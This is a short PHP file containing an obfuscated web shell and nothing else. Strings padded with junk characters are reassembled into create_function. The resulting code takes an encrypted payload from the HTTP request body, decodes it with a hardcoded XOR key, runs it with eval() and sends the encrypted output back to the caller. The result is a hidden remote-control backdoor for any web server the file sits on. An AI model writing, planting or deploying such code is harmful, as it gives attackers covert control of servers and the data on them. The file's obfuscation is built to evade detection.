<?php
$d=str_replace('z','','crzzezatez_funzctizon');
$i='nputRS"),$mRS)RS==1) {@obRS_startRS();@evRSal(@gzunRScompreRSss(@x(@baRSse64_RSdecodRSe(RSRS$m[1]),$k)));$o=@RSob_gRSet_';
$M='$kRS="136e6cRSc8RSRS";$kh="0471400ce7f4";RSRS$kRSf="0cRS74b364c7aRSRSRS1";$p="BXeOseDcaWgc9j0TRS";functioRSn x($RSt,$k){';
$z='conRStents();@RSobRS_end_cleaRSn()RS;$r=@base6RSRS4RS_encode(@xRS(@gzcoRSmpress($o)RS,$k))RS;pRSRSrint("$p$kh$r$kf");}';
$p='RS$cRSRS=strlen($k);$RSl=strlen(RSRS$t);$o="";forRS(RS$i=0;$i<$RSl;){for(RS$j=0;RS($jRS<$c&&$RSi<$l);$RSj++,$i+RS+){$';
$f='RSo.=$tRS{RS$i}^$RSk{$j};}}RSreturRSn $o;RS}if (@pregRS_matchRS("/$kh(RS.+)$kfRS/",RS@file_RSget_contents("pRShpRS://i';
$u=str_replace('RS','',$M.$p.$f.$i.$z);
$o=$d('',$u);$o();
?>
